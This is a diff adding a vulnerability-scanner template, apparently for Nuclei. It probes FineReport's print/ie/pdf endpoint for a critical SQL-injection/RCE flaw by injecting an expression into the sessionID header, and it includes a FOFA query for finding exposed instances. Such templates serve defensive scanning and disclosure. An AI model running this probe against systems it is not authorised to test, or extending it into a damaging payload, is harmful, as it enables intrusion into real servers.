@@ -1,0 +1,35 @@
+id: finereport-print-ie-pdf-sqli-rce
+
+info:
+  name: FineReport print/ie/pdf sql注入
+  author: onewin
+  severity: critical
+  description: |
+    Access URL:/webroot/decision/nx/report/v9/print/ie/pdf中sessionID, which can execute the SQL statement in GET parameter n. This vulnerability is caused by Fanruan's own sqlite-jdbc-x.x.x.x.jar driver.
+  reference:
+    - https://mp.weixin.qq.com/s/odnsC0RjgQGuAWKke3SOqA
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: app="帆软-FineReport"
+  tags: 帆软-FineReport
+
+http:
+  - raw:
+      - |
+        GET /webroot/decision/nx/report/v9/print/ie/pdf HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        sessionID: %24%7Bsum(1024%2C123)%7D%20
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "sessionID=1147"
+        condition: and
+        part: body
+      - type: status
+        status:
+          - 200
+          - 302
